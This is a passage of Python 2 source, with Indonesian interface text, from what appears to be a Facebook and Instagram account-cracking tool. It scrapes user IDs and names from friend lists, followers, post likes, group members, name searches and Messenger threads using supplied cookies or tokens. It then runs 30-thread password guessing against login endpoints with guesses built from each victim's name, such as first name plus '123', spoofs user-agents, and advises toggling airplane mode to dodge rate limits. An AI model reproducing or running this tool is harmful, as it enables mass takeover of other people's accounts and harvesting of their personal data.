            print("\r\033[0;36m[\033[0;00m+\033[0;36m]\033[0;00m Mengumpulkan id >> \033[0;36m%s "%(len(id))),
            sys.stdout.flush();jeda(0.0050)

        jeeckxnano.close()

        print("\n\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m File tersimpan di >> \033[0;36m%s "%(file))
        raw_input("\n\033[0;36m[\033[0;00m ENTER \033[0;36m]")
        menu()
    except Exception as e:
        jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Kemungkinan akun mati / id tersebut privat ");exit()

def followers(jeeckxd,headers=header):
    try:
        os.mkdir('dump')
    except:pass
    try:
    	jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Ketik 'me' jika ingin dump id followers sendiri ")
        idt = raw_input("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Target followers : ")
        batas = raw_input("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Maximal ambil : ")
        
        gas = requests.get('https://graph.facebook.com/%s?access_token=%s'%(idt,jeeckxd))
        nm = json.loads(gas.text)
        file = ('dump/'+nm['first_name']+'.json').replace(' ', '_')
        jeeckxnano = open(file, 'w')
        r = requests.get('https://graph.facebook.com/%s/subscribers?limit=%s&access_token=%s'%(idt,batas,jeeckxd))
        z = json.loads(r.text)
        for _x_ in z['data']:
            id.append(_x_['id'] + '<=>' + _x_['name'])
            jeeckxnano.write(_x_['id'] + '<=>' + _x_['name'] + '\n')
            print("\033[0;36m[\033[0;00m+\033[0;36m]\033[0;00m mengumpulka id >> \033[0;36m%s "%(len(id))),
            sys.stdout.flush();jeda(0.0050)

        jeeckxnano.close()
#        print ('\n\n%s[%s+%s]%s Succes dump followers  %s '%(B,J,B,P,nm["name"]))
        print("\n\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Berhasil ambil id tersebut : \033[0;36m%s "%(nm["name"]))
        print("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m File di simpan di >> \033[0;36m%s "%(file))
        raw_input("\n\033[0;36m[\033[0;00m ENTER \033[0;36m]")
        menu()
    except Exception as e:
        jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m akun kemungkian mati / id tersebut tidak di publikan")

def postingan(jeeckxd,headers=header):
    try:
        os.mkdir('dump')
    except:pass
    try:
    	print("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Dump id postingan :)")
        idt = raw_input("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;33m Id post : ")
        simpan = raw_input("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Nama buat file : ")
        r = requests.get('https://graph.facebook.com/%s/likes?limit=999999&access_token=%s'%(idt,jeeckxd))
        id = []
        z = json.loads(r.text)
        file = ('dump/' + simpan + '.json').replace(' ', '_')
        jeeckxnano = open(file, 'w')
        for _x_ in z['data']:
            id.append(_x_['id'] + '<=>' + _x_['name'])
            jeeckxnano.write(_x_['id'] + '<=>' + _x_['name'] + '\n')
#            print ('\r%s[%s+%s]%s Id Target %s =>%s %s ' % (B,J,B,P,M,H,str(len(id)))),
            print("\r\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Mengumpulkan id >> \033[0;36m%s"%(str(len(id))))
            sys.stdout.flush();jeda(0.0050)

        jeeckxnano.close()
#        print ('\n\n%s[%s+%s]%s Succes Dump Id Postingamln '%(B,J,B,P,))
        print("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m File.tersimpan di >> \033[0;36m%s"%(file))
        raw_input("\n\033[0;36m[\033[0;00m ENTER \033[0;36m]")
        menu()
    except Exception as e:
        jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Kemungkinan akun mati / id tersebut tidak di publikan");exit()

class group:
	
	def __init__(self, cookies):
		self.glist=[]
		self.cookies=cookies
		self.manual();exit()
	def manual(self):
		id=raw_input("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Id group : ")
		if id in(""):
			self.manual()
		else:
			_r_=bs4.BeautifulSoup(requests.get("https://mbasic.facebook.com/groups/"+id,headers=hdcok(),cookies=self.cookies).text,"html.parser")
			if "konten tidak" in _r_.find("title").text.lower():
				exit("Help Input Id Which Fallid Dog")
			else:
				self.listed={"id":id,"name":_r_.find("title").text}
				self.jeeck_xnano_xx()
#				print("%s[%s+%s]%s NIck Name grup%s= > %s%s.."%(B,J,B,P,M,H,self.listed.get("name")[0:20]))
				print("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Nama group >> \033[0;36m%s"%(self.listed.get("name")[0:20]))
				self.dumps("https://mbasic.facebook.com/groups/"+id)
	def jeeck_xnano_xx(self):
#		self.fl=raw_input('%s[%s+%s] NIck Name file %s=> %s'%(B,J,B,M,K)).replace(" ","_")
		self.fl=raw_input("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Nama file >> %s%s"%(B)).replace(" ","_")
		if self.fl=='':self.jeeck_xnano_xx()
		open(self.fl,"w").close()
	def dumps(self, url):
		_r_=bs4.BeautifulSoup(requests.get(url,cookies=self.cookies,headers=hdcok()).text,"html.parser")
#		print("\r%s[%s+%s] %sCollect Id %s=> %s%s \x1b[1;97m- Please Waite......\r"%(B,J,B,S,M,H,str(len(open(self.fl).read().splitlines()))))
		print("\r\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Pengumpulan id >> \033[0;36m%s"%(str(len(open(self.fl).read().splitlines()))))
		sys.stdout.flush(bu);jeda(0.0050)
		for _i_ in _r_.find_all("h3"):
			try:
				if len(bs4.re.findall("\/",_i_.find("a",href=True).get("href")))==1:
					ogeh=_i_.find("a",href=True)
					if "profile.php" in ogeh.get("href"):
						_a_="".join(bs4.re.findall("profile\.php\?id=(.*?)&",ogeh.get("href")))
						if len(_a_)==0:continue
						elif _a_ in open(self.fl).read():
							continue
						else:
							open(self.fl,"a+").write("%s<=>%s\n"%(_a_,ogeh.text))
							continue
					else:
						_a_="".join(bs4.re.findall("/(.*?)\?",ogeh.get("href")))
						if len(_a_)==0:continue
						elif _a_ in open(self.fl).read():
							continue
						else:
							open(self.fl,"a+").write("%s<=>%s\n"%(_a_,ogeh.text))
			except:continue
		for _i_ in _r_.find_all("a",href=True):
			if "Lihat Postingan Lainnya" in _i_.text:
				while True:
					try:
						self.dumps("https://mbasic.facebook.com/"+_i_.get("href"))
						break
					except Exception as e:
						print("\r\x1b[1;91m[+]%s, retrying..."%e);continue
		print ('\n%s[+] Succes dump id member group '%(H,));print ('%s[%s+%s]%s File dump Saved In %s>>%s %s '%(B,J,B,P,M,H,self.fl));raw_input('\n%s[%s+%s] [%s Enter%s ] '%(B,J,B,U,O));menu()
def cek(arg):
	if os.path.exists("data/cookies"):
		if os.path.getsize("data/cookies") !=0:
			return True
		else:return False
	else:return False

def dumpfl():
    cvds = None
    cookie = None
    new = None
    if cek(1) == False:
        try:
            print("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Masukan cookie ya bro agar berjalan ")
            cookie = raw_input("\033[0;36m[\033[0;00m+\033[0;36m]\033[0;00m Cookie : ")
            cvds = cvd(cookie)
            new = True
        except:
            print("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Login gagal ");dumpfl()
    else:
        cvds = cvd(open('data/cookies').read().strip())
    r = requests.get('https://mbasic.facebook.com/profile.php', cookies=cvds, headers=hdcok()).text
    if len(bs4.re.findall('logout', r)) != 0:
        if kueh(cvds) != True:
            print("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Gagal njenk ");exit()
        
        if new == True:
            open('data/cookies', 'w').write(cookie)
        sim=raw_input("\n%s[%s+%s] %sName File %s--> %s "%(B,P,B,P,M,K)).replace(" ","_")
#        sim=raw_input("\033[0;36m[\033[0;00m+\033[0;36m]\033[0;00m Nama file %s: %s "%(B)).replace(" ","_")
#        print ("%s[%s+%s] %sExample Name %s[ %sAisyah Chans %s]"%(B,J,B,P,M,H,M))
        print("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Contoh nama untuk di masukan [ Firman Syah ]")
        s=raw_input("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Nama : ")
        if s in("xnano","Xnano","XNANO","Xnano Jeeck","Xnano jeeck","XNANO JEECK","xnano jeeck"):
        	print("\n%s[%s+%s] %sanak anjing mau crack pake nama gw "%(B,P,B,P));exit()
        elif s in("Xnano Jeeck","Xnano jeeck","XNANO JEECK","xnano jeeck"):
        	print ("\n%s[%s+%s] %sSanz-Tzy Xx Brutall"%(B,J,B,P));exit()
        namah(sim,cvds,"https://mbasic.facebook.com/search/people/?q="+s)
    else:
        try:
            os.remove('data/cookies')
        except:
            pass
        jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Login eror ")
        dumpfl()
    return
def namah(sim,r,b):
	open(sim,"a+")
	b=bs4.BeautifulSoup(requests.get(b, cookies=r,headers=hdcok()).text,"html.parser")
	for i in b.find_all("a",href=True):
		
		print("\r%s[%s+%s] %s Pengumpulan id %s--> %s%s "%(B,P,B,P,P,K,str(len(open(sim).read().splitlines())))),;sys.stdout.flush()
		if "<img alt=" in str(i):
			if "home.php" in str(i["href"]):
				continue
			else:
				g=str(i["href"])
				if "profile.php" in g:
					name=i.find("img").get("alt").replace(", profile picture","")
					d=bs4.re.findall("/profile\.php\?id=(.*?)&",g)
					if len (d) !=0:
						pk="".join(d)
						if pk in open(sim).read():
							pass
						else:
							open(sim,"a+").write("%s<=>%s\n"%(pk,name))
				else:
					d=bs4.re.findall("/(.*?)\?",g)
					name=i.find("img").get("alt").replace(", profile picture","")
					if len(d) !=0:
						pk="".join(d)
						if pk in open(sim).read():
							pass
						else:
							open(sim,"a+").write("%s<=>%s\n"%(pk,name))
		if "Lihat Hasil Selanjutnya" in i.text:
			namah(sim,r,i["href"])
	print ('\n\n\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Berhasil mengambil id dari nama ');print ('%s[%s+%s]%s File di simpan di %s-->%s %s '%(B,p,B,P,M,H,sim));raw_input('\n%s[%s+%s] [%s Enter%s ] '%(B,P,B,U,O));menu()

class pesan:

    def __init__(self, cookies):
        self.cookies = cookies
        
        self.f = raw_input('\n%s[%s+%s] Nama file %s --> \033[0;36m%s '%(B,P,B,M,K)).replace(' ', '_')
        if self.f == '':
            pesan(cookies)
        open(self.f, 'w').close()
        self.dump('https://mbasic.facebook.com/messages')
    def dump(self,url):
    	open(self.f, 'a+')
        bs = bs4.BeautifulSoup(requests.get(url, headers=hdcok(), cookies=self.cookies).text, 'html.parser')
#        print ("\r%s%s%s mengumpulkan id %s> %s%s \x1b[1;97m- mohon tunggu\r"%(B,til,P,M,H,str(len(open(self.f).read().splitlines()))));sys.stdout.flush();jeda(0.0050)
        print("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Mengumpulkan id >> \033[0;36m%s "%(str(len(open(self.f).read().splitlines()))));sys.stdout.flush();jeda(0.0050)
        for i in bs.find_all('a', href=True):
            if '/messages/read' in i.get('href'):
                f = bs4.re.findall('cid\\.c\\.(.*?)%3A(.*?)&', i.get('href'))
                try:
                    for ip in list(f.pop()):
                        if self.cookies.get(' c_user') in ip:
                            continue
                        else:
                            if 'pengguna facebook' in i.text.lower():
                                continue
                            open(self.f, 'a+').write('%s<=>%s\n' % (ip, i.text))
                except Exception as e:
                    continue
            if 'Lihat Pesan Sebelumnya' in i.text:
                self.dump('https://mbasic.facebook.com/' + i.get('href'))
#        print ('\n%s%s Succes dump id pesan mesengger '%(H,til))
#        print ('%s%s%s File dump tersimpan %s=>%s %s '%(B,til,P,M,H,self.f))
        print("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m File tersimpan di >> \033[0;36m%s "%(self.f))
        raw_input("\n\033[0;36m[\033[0;00m ENTER \033[0;36m]");menu()

def r_ikut(cookie, id_target, limit, lpg):
	global looping
	if lpg in[""]:
#		print '\n%s%s isi yang benar'%(M,til);jeda(2);exit()
		print("\n\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Isi dengan benar");exit()
	elif lpg in["1","01"]:
		url = "https://i.instagram.com/api/v1/friendships/{}/followers/?count={}".format(id_target, limit)
	elif lpg in["2","02"]:
		url = "https://i.instagram.com/api/v1/friendships/{}/following/?count={}".format(id_target, limit)
	else:
#		print '\n%s%s isi yang benar'%(M,til);jeda(2);exit()
		print("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Isi dengan benar ");exit()
	with requests.Session() as ses:
		otw = ses.get(url, cookies=cookie, headers=headerz_api)
		for _j_ in json.loads(otw.content)["users"]:
			username = _j_["username"]
			nama = _j_["full_name"].encode("utf-8")
			if len(status_foll) != 1:
#				print "\r%s•%s Total user%s > %s%s"%(U,O,M,K,len(mi)),
				print("\r\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Total >> \033[0;36m%s "%(len(mi))),
				sys.stdout.flush()
				mi.append(username+"|"+nama.decode("utf-8"))
				looping+=1
			else:
				poll.append(username)
None
 
ugent = random.choice([
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36"
"Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)",
"NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+",
"NokiaX2-00/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; en-us; nokiax2-00)",
"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2",
"Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.1.1; Navori QL Stix 3500 Build/LMY49F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/67.0.3396.87 Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.0; SM-G930F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/127.0.0.22.69;]",
"Mozilla/5.0 (Linux; Android 7.0; MHA-L29 Build/HUAWEIMHA-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/127.0.0.22.69;]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_2 like Mac OS X) AppleWebKit/603.2.4 (KHTML, like Gecko) Mobile/14F89 [FBAN/FBIOS;FBAV/96.0.0.45.70;FBBV/60548545;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/10.3.2;FBSS/2;FBCR/E-Plus;FBID/phone;FBLC/de_DE;FBOP/5;FBRV/0]",
"Mozilla/5.0 (Linux; Android 4.4.4; G7-L01 Build/HuaweiG7-L01) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/121.0.0.15.70;]",
"Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320F Build/LMY47V) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]",
"Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.77 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]",
"[FBAN/FB4A,FBAV/222.0.0.48.113;FBBV/155323366;FBDM/{density=2.0,width=720,height=1360};FBLC/sr_RS;FBRV/156625696;FBCR/mt:s;FBMF/HUAWEI;FBBD/HUAWEI,.FBPN/com.facebook.katana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19.FBCA/armeabi-v7a:armeabi,]"
])

def useragent():
	jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m --> Fitur [ USER AGENT ]\n\n")
	print("\033[0;36m[\033[0;35m01\033[0;36m]\033[0;00m Ganti user-agent")
	print("\033[0;36m[\033[0;35m02\033[0;36m]\033[0;00m Cek user-agent sekarang")
	print("\033[0;36m[\033[0;35m00\033[0;36m]\033[0;00m Kembali ke MENU")
	_jeeclxnano = raw_input("\n\033[0;36m[\033[0;00m+\033[0;36m]\033[0;00m Input : ")
	uas(_jeeclxnano)
	
def uas(_jeeclxnano):
    if _jeeclxnano == '':
        print("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Isi Dengan benar ya bangsat ");jeda(2);uas(_jeeclxnano)
    elif _jeeclxnano in("1","01"):

   	jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Ketik 'Panjul' untuk seting user-agent defaults")
    	try:
    	    ua = raw_input("\033[0;36m[\033[0;00m+\033[0;36m]\033[0;00m User-agent : ")
            if ua in(""):
            	print("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Isi dengan benar");jeda(2);menu()

            elif ua in("PANJUL","panjul","Panjul"):
            	ua_ = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]")
                open("data/ua.txt","w").write(ua_);jeda(2)
                jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Bsrhasil mengganti");jeda(2);menu()
            open("data/ua.txt","w").write(ua);jeda(2)
            jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Berhasil mengganti ");jeda(2);menu()
        except KeyboardInterrupt:
			print("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Gagal mengganti ");exit()
    elif _jeeclxnano in("2","02"):
        try:
        	ua_ = open('data/ua.txt', 'r').read();jeda(2);print ("%s%s%s User-agent sekarang  --> %s%s"%(U,til,O,H,ua_));jeda(2);raw_input('\n%s%s%s [%s Enter%s ] '%(U,til,O,U,O));menu()
        except IOError:
        	ua_ = '%s-'%(M)
    elif _jeeclxnano in("0","00"):
    	menu()
    else:
        jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Wronk Cook ");jeda(2);uas(_jeeclxnano)

class jeckoramadhanganteng:

    def __init__(self):
        self.id = []
    def jeeckxtampany(self):
        try:
            self.apk = raw_input("\n\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m  hasil dump anda : ")
            self.id = open(self.apk).read().splitlines()
#            print ('%s[%s+%s]%s Total Id%s => %s%s' %(B,J,B,S,M,H,len(self.id)))
            print("\033[0;36m[\033[0;00m+\033[0;36m]\033[0;00m Total id => \033[0;36m%s "%(len(self.id)))
        except:
            print("\033[0;36m[\033[0;00m+\033[0;36m]\033[0;35m File tidak di temukan / kosong ")
            raw_input("\033[0;36m[\033[0;00mENTER\033[0;36m]");menu()
        je = raw_input("\n\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Ingin menggunakan password manual/otomatis (M/O) : ")
        if je in ('m', 'M'):
            print("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Contoh password ( jeeckgantenk,jecko12345,anjinklubabi)")
            while True:
                pwx = raw_input("\n\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Password : ")
                if pwx == '':
                    jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Jangan kosong ")
                elif len(pwx)<=5:
                    print("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Password masimal 6 karakter")
                else:
                    def manual(brute=None): 
                        ind = raw_input("\n\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Input : ")
                        if ind == '':
                            print("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Isi Dengan benar");manual()
                        elif ind in ('1', '01'):
#                            print ('\n%s[%s+%s]%s Results %s[OK] %sSaved In %s=> %sOK/%s.txt'%(B,J,B,P,H,P,M,H,waktu));jeda(0.2)
                            print("\n\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Results OK di simpan di *--> \033[0;36mOK/%s.txt"%(waktu))
                            print("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Results CP di simpan di *--> \033[0;36mCP/%s.txt"%(waktu))
                            print("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;31m Jika 100 aktifkan mode pesawat 2 detik\n\n\n")
                            with ThreadPoolExecutor(max_workers=30) as log:
                                for akun in self.id:
                                    try:
                                        _heck_ = akun.split('<=>')[0]
                                        log.submit(self.b_api, _heck_, brute)
                                    except: pass
                            os.remove(self.apk)
                            exit("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Crack selesai >_")
                        elif ind in ('2', '02'):
                            print("\n\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Results OK di simpan di *-->\033[0;32m OK/%s.txt"%(waktu))
                            print("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Results CP di simpan di *-->\033[0;33m CP/%s.txt"%(waktu))
                            print("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;31m Jika 100 aktifkan mode pesawat 2 detik\n\n\n\n")
                            with ThreadPoolExecutor(max_workers=30) as log:
                                for akun in self.id:
                                    try:
                                        _heck_ = akun.split('<=>')[0]
                                        log.submit(self.basic, _heck_, brute)
                                    except: pass
                            os.remove(self.apk)
                            exit("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m FINISED")
                        elif ind in ('4', '04'):
                            print("\n\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Results OK di simpan di *--> \033[0;32mOK/%s.txt"%(waktu))
                            print("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Results CP di simpan di *-->\033[0;33m CP/%s.txt"%(waktu))
                            print("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;31m Jika 100 aktifkan mode pesawat 2 detik\n\n\n")
                            with ThreadPoolExecutor(max_workers=30) as log:
                                for akun in self.id:
                                    try:
                                        _heck_ = akun.split('<=>')[0]
                                        log.submit(self.mobhil, _heck_, brute)
                                    except: pass
                            os.remove(self.apk)
                            exit("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m FINISED")
                  
      					
					
					
				
			
					
		
		 				
				
                        elif ind in ('3', '03'):
                            print("\n\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Results OK di simpan di *--> \033[0;32mOK/%s.txt"%(waktu))
                            print("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Results CP di simpam di *--> \033[0;3mCP/%s.txt"%(waktu))
                            print("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;31m Jika 100 aktifkan mode pesawat 2 detik\n\n\n")
                            with ThreadPoolExecutor(max_workers=30) as log:
                                for akun in self.id:
                                    try:
                                        _heck_ = akun.split('<=>')[0]
                                        log.submit(self.mobil, _heck_, brute)
                                    except: pass
                            os.remove(self.apk)
                            exit("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m FINISED")
                        else:
                            jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Wronk Input");manual()
                    jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Pilih method satu-satu\n")
                    jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;31m Disarankan menggunakan metode mobile fb\n")
                    print("\n\033[0;36m[\033[0;35m01\033[0;36m]\033[0;00m B-API\033[0;36m Fast Crack")
                    print("\033[0;36m[\033[0;35m02\033[0;36m]\033[0;00m Mbasic\033[0;36m Sellow Crack ")
                    print("\033[0;36m[\033[0;35m03\033[0;36m]\033[0;00m Mobile\033[0;36m Sellow Crack\033[0;33mRecomended V1\033[0;00m")
                    print("\033[0;36m[\033[0;35m04\033[0;36m]\033[0;00m Mobile\033[0;36m Sellow Crack\033[0;33mRecomended V2\033[0;00m")
                    manual(pwx.split(','))
                    break
        elif je in ('o', 'O'):
           
            print("\n\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Pilih method satu-satu")
            jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;31m Disarankan menggunakan metode mobile fb\n")
            print("\n\033[0;36m[\033[0;35m01\033[0;36m]\033[0;00m B-Api\033[0;36m Fast Crack")
            print("\033[0;36m[\033[0;35m02\033[0;36m]\033[0;00m Mbasic\033[0;36m Sellow Crack")
            print("\033[0;36m[\033[0;35m03\033[0;36m]\033[0;00m Mobile\033[0;36m Sellow Crack\033[0;33m Recomended V1\033[0;00m")
            print("\033[0;36m[\033[0;35m04\033[0;36m]\033[0;00m Mobile\033[0;36m Sellow Crack\033[0;33m Recomended V2\033[0;00m")
            self.langsung()
        else:
            jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m WRONK INPUT :(");jeda(2);menu()
    
    def langsung(self):
        mrjeeckperudallaccountkegelapanxxznanowibu = raw_input("\n\033[0;36m[\033[0;00m+\033[0;36m]\033[0;00m Method : ")
        if mrjeeckperudallaccountkegelapanxxznanowibu == '':
            print("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Wronk INput ");self.langsung()
        elif mrjeeckperudallaccountkegelapanxxznanowibu in ('1', '01'):
            print("\n\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Results OK di simpan di *--> \033[0;32mOK/%s.txt "%(waktu))
            print("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Results CP di simpan di *-->\033[0;33m CP/%s.txt"%(waktu))
            print("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;31m Jika 100 aktifkan mode pesawat 2 detik")
            with ThreadPoolExecutor(max_workers=30) as log:
            	for akun in self.id: 
                    try:
                        uid, name = akun.split('<=>')
                        _i_ = name.split(' ')
                        if len(_i_) == 3 or len(_i_) == 4 or len(_i_) == 5 or len(_i_) == 6:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        else:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        log.submit(self.b_api, uid, pwx)
                    except: pass
            os.remove(self.apk)
            exit("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Crack Selesai >_")
        elif mrjeeckperudallaccountkegelapanxxznanowibu in ('2', '02'):
            print("\n\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Results OK di simpan di *--> \033[0;32mOK/%s.txt"%(waktu))
            print("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Results CP di simpan di *--> \033[0;33mCP/%s.txt"%(waktu))
            jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;31m Jika 100 aktifkan mode pesawat 2 detik")
            with ThreadPoolExecutor(max_workers=30) as log:
            	for akun in self.id: 
                    try:
                        uid, name = akun.split('<=>')
                        _i_ = name.split(' ')
                        if len(_i_) == 3 or len(_i_) == 4 or len(_i_) == 5 or len(_i_) == 6:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        else:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        log.submit(self.basic, uid, pwx)
                    except: pass
            os.remove(self.apk)
            exit("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Crack Selesai >_")
         
  
        elif mrjeeckperudallaccountkegelapanxxznanowibu in ('3', '03'):
            print("\n\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Results OK di simpan di *--> \033[0;32mOK/%s.txt "%(waktu))
            print("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Results CP di simpan di *--> \033[0;33mCP/%s.txt "%(waktu))
            jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;31m Jika 100 aktifkan mode pesawaat 2 detik")
            with ThreadPoolExecutor(max_workers=30) as log:
            	for akun in self.id: 
                    try:
                        uid, name = akun.split('<=>')
                        _i_ = name.split(' ')
                        if len(_i_) == 3 or len(_i_) == 4 or len(_i_) == 5 or len(_i_) == 6:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        else:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        log.submit(self.mobil, uid, pwx)
                    except: pass
            os.remove(self.apk)
            exit("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m FINISED......")
            
        elif mrjeeckperudallaccountkegelapanxxznanowibu in ('4', '04'):
            print("\n\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Results OK di simpan di *--> \033[0;32mOK/%s.txt"%(waktu))
            print("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Results CP di simpan di *--> \033[0;33mCP/%s.txt"%(waktu))
            jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;31mJika 100 aktifkan mode pesawat 2 detik")
            with ThreadPoolExecutor(max_workers=30) as log:
            	for akun in self.id: 
                    try:
                        uid, name = akun.split('<=>')
                        _i_ = name.split(' ')
